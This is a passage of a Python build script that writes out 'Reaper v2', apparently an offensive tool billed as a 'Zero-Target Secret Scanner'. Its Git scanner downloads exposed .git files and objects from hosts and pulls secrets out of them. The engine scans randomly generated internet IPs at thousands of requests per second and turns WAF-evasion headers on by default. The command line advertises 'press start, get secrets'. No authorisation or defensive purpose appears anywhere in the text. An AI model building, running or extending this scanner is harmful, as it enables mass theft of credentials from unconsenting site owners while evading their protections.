        if primary_resp and (all_secrets or all_new_targets):
            return ScanResult(url=f"{base_url}{path}", status=primary_resp["status"],
                              scanner=self.name, secrets=all_secrets,
                              new_targets=list(set(all_new_targets)),
                              response_size=primary_resp["size"])
        return None
'''

# ============================================================
# scanners/git_scanner.py
# ============================================================
STRUCTURE["reaper/scanners/git_scanner.py"] = r'''"""
Reaper — Git Scanner
"""

import re
import zlib
import aiohttp
from typing import Optional
from extractors.secrets import extract_secrets
from extractors.link_parser import extract_all_targets
from core.waf_bypass import generate_headers
from core.result_store import ScanResult
from utils.http_utils import fetch

GIT_PATHS = [
    "/.git/config", "/.git/HEAD", "/.git/index",
    "/.git/logs/HEAD", "/.git/refs/heads/master",
    "/.git/refs/heads/main", "/.git/refs/heads/develop",
    "/.git/description", "/.git/packed-refs",
]
GIT_CONFIG_MARKERS = ["[core]", "[remote", "[branch", "repositoryformatversion"]
SHA1_PATTERN = re.compile(r"\b[0-9a-f]{40}\b")


class GitScanner:
    name = "git"

    def __init__(self, waf_evasion: bool = True, max_objects: int = 50):
        self.waf_evasion = waf_evasion
        self.max_objects = max_objects

    async def scan(self, session: aiohttp.ClientSession,
                   target_host: str, target_port: int, path: str,
                   is_ip: bool = False, scheme: str = "https") -> Optional[ScanResult]:
        if target_port == 80:
            scheme = "http"
        base_url = f"{scheme}://{target_host}:{target_port}"
        headers = generate_headers(
            custom_host=target_host if not is_ip else None
        ) if self.waf_evasion else {}
        all_secrets = []
        all_new_targets = []
        git_exposed = False
        for git_path in GIT_PATHS:
            url = f"{base_url}{git_path}"
            resp = await fetch(session, url, headers=headers)
            if resp is None or resp["status"] != 200:
                continue
            body = resp["body"]
            if git_path.endswith("/config"):
                if any(m in body for m in GIT_CONFIG_MARKERS):
                    git_exposed = True
                    all_secrets.extend(extract_secrets(body, source_url=url))
                    td = extract_all_targets(body, base_url=url)
                    all_new_targets.extend(td["ips"] + td["domains"])
            elif git_path.endswith("/HEAD"):
                if body.strip().startswith("ref:") or SHA1_PATTERN.match(body.strip()):
                    git_exposed = True
            else:
                shas = SHA1_PATTERN.findall(body)
                if shas:
                    git_exposed = True
                all_secrets.extend(extract_secrets(body, source_url=url))
        if not git_exposed:
            return None
        sha_candidates = set()
        for gp in ["/.git/logs/HEAD", "/.git/packed-refs",
                    "/.git/refs/heads/master", "/.git/refs/heads/main"]:
            url = f"{base_url}{gp}"
            resp = await fetch(session, url, headers=headers)
            if resp and resp["status"] == 200:
                sha_candidates.update(SHA1_PATTERN.findall(resp["body"]))
        fetched = 0
        for sha in list(sha_candidates):
            if fetched >= self.max_objects:
                break
            obj_path = f"/.git/objects/{sha[:2]}/{sha[2:]}"
            url = f"{base_url}{obj_path}"
            try:
                async with session.get(url, headers=headers, allow_redirects=False) as raw:
                    if raw.status != 200:
                        continue
                    data = await raw.read()
                    fetched += 1
                    try:
                        decompressed = zlib.decompress(data)
                        text = decompressed.decode("utf-8", errors="replace")
                        all_secrets.extend(extract_secrets(text, source_url=url))
                        td = extract_all_targets(text, base_url=url)
                        all_new_targets.extend(td["ips"] + td["domains"])
                        sha_candidates.update(SHA1_PATTERN.findall(text))
                    except (zlib.error, UnicodeDecodeError):
                        pass
            except (aiohttp.ClientError, Exception):
                continue
        if all_secrets or all_new_targets:
            return ScanResult(url=f"{base_url}/.git/", status=200,
                              scanner=self.name, secrets=all_secrets,
                              new_targets=list(set(all_new_targets)))
        return None
'''

# ============================================================
# core/engine.py
# ============================================================
STRUCTURE["reaper/core/engine.py"] = r'''"""
Reaper v2 — Main Engine
"""

import asyncio
import logging
from typing import Optional
from pathlib import Path

from config import ScanConfig
from core.path_loader import PathLoader
from core.ip_generator import IPGenerator
from core.target_gen import TargetGenerator, Target
from core.scanner import ScannerEngine
from core.result_store import ResultStore

from scanners.path_scanner import PathScanner
from scanners.js_scanner import JSScanner
from scanners.r2s_scanner import R2SScanner
from scanners.nvca_scanner import NVCAScanner
from scanners.ajs_scanner import AJSScanner
from scanners.uafr_scanner import UAFRScanner
from scanners.git_scanner import GitScanner

logger = logging.getLogger("reaper")


class ReaperEngine:
    def __init__(self, config: Optional[ScanConfig] = None):
        self.config = config or ScanConfig()
        self.path_loader = PathLoader()
        self.result_store = ResultStore()
        self.ip_generator = IPGenerator(self.config)
        self.target_gen = TargetGenerator(
            exclude_private=self.config.exclude_private,
            max_targets=self.config.max_targets)
        self.scanner_engine = ScannerEngine(self.config, self.result_store)
        waf = self.config.waf_evasion
        scanner_map = {
            "path": PathScanner(waf_evasion=waf),
            "js": JSScanner(waf_evasion=waf),
            "r2s": R2SScanner(waf_evasion=waf),
            "nvca": NVCAScanner(waf_evasion=waf),
            "ajs": AJSScanner(waf_evasion=waf),
            "uafr": UAFRScanner(waf_evasion=waf),
            "git": GitScanner(waf_evasion=waf),
        }
        for name, scanner in scanner_map.items():
            if name in self.config.enabled_scanners:
                self.scanner_engine.register_scanner(scanner)

    async def run(self, wordlist_files: Optional[list[str]] = None,
                  inline_paths: Optional[str] = None,
                  no_default_paths: bool = False):
        if not no_default_paths:
            self.path_loader.load_default()
            logger.info(f"Default paths: {len(self.path_loader.get_wordlist('default'))}")
        if wordlist_files:
            for wf in wordlist_files:
                c = self.path_loader.load_file(wf)
                logger.info(f"Wordlist '{wf}': {c} paths")
        if inline_paths:
            c = self.path_loader.load_from_string(inline_paths, "inline")
            logger.info(f"Inline paths: {c}")
        all_paths = self.path_loader.get_all_paths()
        if not all_paths:
            logger.error("No paths loaded.")
            return
        logger.info(f"Total paths: {len(all_paths)}")
        logger.info("Generating targets...")
        alive = await self.ip_generator.generate()
        if not alive:
            logger.error("No alive targets.")
            return
        targets = [Target(host=ip, port=port, is_ip=True, source="auto")
                   for ip, port in alive]
        logger.info(f"Targets: {len(targets)} (gen {self.ip_generator.stats['generated']}, "
                     f"alive {self.ip_generator.stats['alive']})")
        await self.scanner_engine.run(targets, all_paths, self.target_gen)
        Path(self.config.output_dir).mkdir(parents=True, exist_ok=True)
        self.result_store.export_json(f"{self.config.output_dir}/results.json")
        self.result_store.export_csv(f"{self.config.output_dir}/results.csv")
        print(f"\n{self.result_store.summary()}")
        print(f"\nResults: {self.config.output_dir}/")
        logger.info(f"IP stats: {self.ip_generator.stats}")
        logger.info(f"Chain stats: {self.target_gen.stats}")
        await self.scanner_engine.close()
'''

# ============================================================
# main.py
# ============================================================
STRUCTURE["reaper/main.py"] = r'''#!/usr/bin/env python3
"""
Reaper v2 — Zero-Target Exposed Secrets Scanner

Usage:
    python main.py -w paths.txt
    python main.py -w paths.txt --max-targets 100000 --rps 5000
    python main.py  (uses built-in default paths)
"""

import argparse
import asyncio
import logging
import sys
from pathlib import Path

from config import ScanConfig
from core.engine import ReaperEngine


def setup_logging(verbose: bool = True, log_dir: str = "results"):
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    fmt = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    handlers = [
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(f"{log_dir}/reaper.log", encoding="utf-8"),
    ]
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format=fmt, handlers=handlers)
    logging.getLogger("aiohttp").setLevel(logging.WARNING)
    logging.getLogger("asyncio").setLevel(logging.WARNING)


def parse_args():
    p = argparse.ArgumentParser(
        prog="reaper",
        description="Reaper v2 — Load paths, press start, get secrets.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -w paths.txt
  %(prog)s -w paths.txt --max-targets 100000 --rps 5000
  %(prog)s -w p1.txt -w p2.txt --target-mode ranges
  %(prog)s  (default built-in paths)
        """)

    g = p.add_argument_group("Paths")
    g.add_argument("-w", "--wordlist", action="append", default=[],
                   help="Path wordlist (.txt/.json/.csv). Multiple OK.")
    g.add_argument("--no-default-paths", action="store_true")

    g = p.add_argument_group("Target Generation")
    g.add_argument("--max-targets", type=int, default=50000)
    g.add_argument("--target-mode", choices=["random","ranges","api","all"], default="all")
    g.add_argument("--no-precheck", action="store_true")
    g.add_argument("--precheck-timeout", type=float, default=2.0)
    g.add_argument("--precheck-concurrency", type=int, default=5000)
    g.add_argument("--ports", type=str, default="80,443,8080,8443")

    g = p.add_argument_group("Scanning")
    g.add_argument("--mode", choices=["L4","L7","L4+L7"], default="L4+L7")
    g.add_argument("--rps", type=int, default=4000)
    g.add_argument("--concurrency", type=int, default=800)
    g.add_argument("--scanners", type=str, default="path,js,r2s,nvca,ajs,uafr,git")
    g.add_argument("--no-waf-bypass", action="store_true")
    g.add_argument("--connect-timeout", type=float, default=5.0)
    g.add_argument("--read-timeout", type=float, default=8.0)

    g = p.add_argument_group("Output")
    g.add_argument("-o", "--output", type=str, default="results")
    g.add_argument("-q", "--quiet", action="store_true")

    return p.parse_args()


def main():
    args = parse_args()
    setup_logging(verbose=not args.quiet, log_dir=args.output)
    ports = [int(x.strip()) for x in args.ports.split(",")]

    config = ScanConfig(
        max_targets=args.max_targets,
        target_mode=args.target_mode,
        ports=ports,
        precheck_ports=not args.no_precheck,
        precheck_timeout=args.precheck_timeout,
        precheck_concurrency=args.precheck_concurrency,
        max_concurrent_requests=args.concurrency,
        target_rps=args.rps,
        scan_mode=args.mode,
        connect_timeout=args.connect_timeout,
        read_timeout=args.read_timeout,
        waf_evasion=not args.no_waf_bypass,
        enabled_scanners=[s.strip() for s in args.scanners.split(",")],
        output_dir=args.output,
        verbose=not args.quiet,
    )

    engine = ReaperEngine(config)
    wl = args.wordlist if args.wordlist else None

    print(r"""
    ____
   / __ \___  ____ _____  ___  _____
  / /_/ / _ \/ __ `/ __ \/ _ \/ ___/
 / _, _/  __/ /_/ / /_/ /  __/ /
/_/ |_|\___/\__,_/ .___/\___/_/   v2
                /_/
    Zero-Target Secret Scanner
    """)
    print(f"  Wordlists:   {len(wl) if wl else 'default'}")
    print(f"  Max targets: {config.max_targets:,}")
    print(f"  Mode:        {config.target_mode} | {config.scan_mode}")
    print(f"  Ports:       {config.ports}")
    print(f"  RPS:         {config.target_rps:,}")
    print(f"  Scanners:    {', '.join(config.enabled_scanners)}")
    print(f"  WAF bypass:  {'ON' if config.waf_evasion else 'OFF'}")
    print(f"  Output:      {config.output_dir}/")
    print()

    asyncio.run(engine.run(wordlist_files=wl, no_default_paths=args.no_default_paths))


if __name__ == "__main__":
    main()
'''

# ============================================================
# requirements.txt
# ============================================================
STRUCTURE["reaper/requirements.txt"] = "aiohttp>=3.9.0\n"


def build():
    created_dirs = set()
    for filepath, content in sorted(STRUCTURE.items()):
        dirpath = os.path.dirname(filepath)
        if dirpath and dirpath not in created_dirs:
            os.makedirs(dirpath, exist_ok=True)
            created_dirs.add(dirpath)
            print(f"  [dir]  {dirpath}/")

        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"  [file] {filepath}")

    print(f"\n  Done. {len(STRUCTURE)} files created.")
    print(f"\n  cd reaper && pip install -r requirements.txt && python main.py -w paths.txt\n")


if __name__ == "__main__":
    print("\n  Reaper v2 — Building project structure...\n")
    build()